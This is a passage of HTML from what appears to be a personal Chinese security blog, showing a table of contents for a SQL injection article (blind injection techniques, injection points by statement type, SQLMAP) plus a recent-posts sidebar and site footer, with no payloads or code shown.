href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9Abenchmark"><span class="toc-number">2.3.5.3.</span> <span class="toc-text">基于时间延时的盲注：benchmark</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9A%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="toc-number">2.3.5.4.</span> <span class="toc-text">基于时间延时的盲注：笛卡尔积</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9Aget-lock"><span class="toc-number">2.3.5.5.</span> <span class="toc-text">基于时间延时的盲注：get_lock()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9A%84%E7%9B%B2%E6%B3%A8%EF%BC%9ARLIKE"><span class="toc-number">2.3.5.6.</span> <span class="toc-text">基于时间延时的盲注：RLIKE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.6.</span> <span class="toc-text">二次注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-%E4%B8%8D%E5%90%8C%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E5%AF%B9%E5%BA%94%E6%8A%80%E5%B7%A7"><span class="toc-number">2.4.</span> <span class="toc-text">0x4 不同的注入点的对应技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.1.</span> <span class="toc-text">select注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8select%E4%B9%8B%E5%90%8E%EF%BC%8Cfrom%E4%B9%8B%E5%89%8D"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">注入点在select之后，from之前</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8%E5%BC%95%E7%94%A8%E8%A1%A8"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">注入点在引用表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8where%E6%9D%A1%E4%BB%B6%E4%BB%A5%E5%90%8E"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">注入点在where条件以后</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8group-by%E6%88%96%E8%80%85order-by%E4%B9%8B%E5%90%8E"><span class="toc-number">2.4.1.4.</span> <span class="toc-text">注入点在group by或者order by之后</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8limit%E4%B9%8B%E5%90%8E"><span class="toc-number">2.4.1.5.</span> <span class="toc-text">注入点在limit之后</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.2.</span> <span class="toc-text">insert注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8%E8%A6%81%E6%8F%92%E5%85%A5%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">注入点在要插入的表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8%E6%8F%92%E5%85%A5%E7%9A%84%E5%80%BC"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">注入点在插入的值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.3.</span> <span class="toc-text">update注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8set%E5%90%8E%E8%BE%B9"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">注入点在set后边</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8values%E5%90%8E%E9%9D%A2"><span class="toc-number">2.4.3.2.</span> <span class="toc-text">注入点在values后面</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.4.</span> <span class="toc-text">delete注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8where%E4%B9%8B%E5%90%8E"><span class="toc-number">2.4.4.1.</span> <span class="toc-text">注入点在where之后</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E5%9C%A8%E8%A1%A8%E5%90%8D%E4%B8%AD"><span class="toc-number">2.4.4.2.</span> <span class="toc-text">注入点在表名中</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NO-3SQLMAP"><span class="toc-number">3.</span> <span class="toc-text">NO.3SQLMAP</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/Nmap/blog(Nmap)/" title="Nmap用法"><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nmap用法"/></a><div class="content"><a class="title" href="/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/Nmap/blog(Nmap)/" title="Nmap用法">Nmap用法</a><time datetime="2022-11-11T11:06:32.000Z" title="发表于 2022-11-11 19:06:32">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web%E5%AE%89%E5%85%A8/SQL/blog(SQL)/" title="SQL基础"><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL基础"/></a><div class="content"><a class="title" href="/web%E5%AE%89%E5%85%A8/SQL/blog(SQL)/" title="SQL基础">SQL基础</a><time datetime="2022-11-11T11:06:10.000Z" title="发表于 2022-11-11 19:06:10">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/blog(php)/" title="web基础"><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="web基础"/></a><div class="content"><a class="title" href="/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/blog(php)/" title="web基础">web基础</a><time datetime="2022-11-11T11:05:52.000Z" title="发表于 2022-11-11 19:05:52">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E9%9B%B6%E7%A2%8E/Web/web/" title="Web"><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web"/></a><div class="content"><a class="title" href="/%E9%9B%B6%E7%A2%8E/Web/web/" title="Web">Web</a><time datetime="2022-10-16T09:48:52.000Z" title="发表于 2022-10-16 17:48:52">2022-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80/c%E8%AF%AD%E8%A8%80/" title="C语言笔记"><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/OIP-C.XdJTda4pBwUuQ-QxCDnxkgHaE2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="C语言笔记"/></a><div class="content"><a class="title" href="/%E7%AC%94%E8%AE%B0/C%E8%AF%AD%E8%A8%80/c%E8%AF%AD%E8%A8%80/" title="C语言笔记">C语言笔记</a><time datetime="2022-10-16T09:48:52.000Z" title="发表于 2022-10-16 17:48:52">2022-10-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Chronos</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>